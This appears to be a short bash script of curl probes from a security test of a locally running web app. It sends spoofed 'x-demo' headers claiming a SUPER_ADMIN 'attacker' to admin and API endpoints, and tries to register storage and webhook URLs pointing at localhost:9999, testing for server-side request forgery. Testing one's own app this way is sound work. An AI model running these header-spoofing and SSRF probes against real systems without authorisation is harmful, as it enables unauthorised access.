#!/bin/bash
echo "=== PROBE 6A: file-storage connections ==="
curl -s -w "\nHTTP: %{http_code}\n" -X POST http://localhost:3005/api/admin/file-storage/connections \
  -H "Content-Type: application/json" \
  -H "x-demo-user-id: attacker" -H "x-demo-organization-id: evil-org" -H "x-demo-role: SUPER_ADMIN" \
  -d '{"provider":"s3","endpoint":"http://localhost:9999/","bucket":"test"}' 2>&1 | head -10

echo ""
echo "=== PROBE 6B: Webhook endpoint ==="
curl -s -w "\nHTTP: %{http_code}\n" -X POST http://localhost:3005/api/v1/webhooks \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:9999/","event":"test"}' 2>&1 | head -10

echo ""
echo "=== PROBE 7: Dashboard API with demo headers ==="
curl -s -w "\nHTTP: %{http_code}\n" \
  -H "x-demo-user-id: attacker" -H "x-demo-organization-id: evil-org" -H "x-demo-role: SUPER_ADMIN" \
  http://localhost:3005/api/admin/dashboard 2>&1 | head -10

echo ""
echo "=== PROBE 8: API v1 with demo headers ==="
curl -s -w "\nHTTP: %{http_code}\n" \
  -H "x-demo-user-id: attacker" -H "x-demo-organization-id: evil-org" -H "x-demo-role: SUPER_ADMIN" \
  http://localhost:3005/api/v1/jobs 2>&1 | head -10

echo ""
echo "=== PROBE 9: Bearer token test ==="
curl -s -w "\nHTTP: %{http_code}\n" \
  -H "Authorization: Bearer invalid123" \
  http://localhost:3005/api/v1/jobs 2>&1 | head -5
